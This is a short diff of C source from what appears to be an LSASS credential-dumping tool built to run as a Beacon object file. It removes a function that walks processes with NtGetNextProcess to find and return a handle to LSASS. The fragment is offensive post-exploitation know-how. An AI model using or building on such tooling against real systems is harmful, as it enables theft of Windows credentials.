@@ -1,4 +1,5 @@
 #include "../include/utils.h"
+#include "../include/handle.h"
 #include "../include/syscalls.h"
 
 PVOID get_process_image(HANDLE hProcess)
@@ -70,49 +71,6 @@ BOOL is_lsass(HANDLE hProcess)
 
     intFree(image); image = NULL;
     return FALSE;
-}
-
-HANDLE find_lsass(DWORD dwFlags)
-{
-    // loop over each process
-    HANDLE hProcess = NULL;
-    while (TRUE)
-    {
-        NTSTATUS status = NtGetNextProcess(
-            hProcess,
-            dwFlags,
-            0,
-            0,
-            &hProcess
-        );
-        if (status == STATUS_NO_MORE_ENTRIES)
-        {
-#ifdef BOF
-            BeaconPrintf(CALLBACK_ERROR,
-#else
-            printf(
-#endif
-                "The LSASS process was not found.\n"
-            );
-            return NULL;
-        }
-        if (!NT_SUCCESS(status))
-        {
-#ifdef DEBUG
-#ifdef BOF
-            BeaconPrintf(CALLBACK_ERROR,
-#else
-            printf(
-#endif
-                "Failed to call NtGetNextProcess, status: 0x%lx\n",
-                status
-            );
-#endif
-            return NULL;
-        }
-        if (is_lsass(hProcess))
-            return hProcess;
-    }
 }
 
 DWORD get_pid(
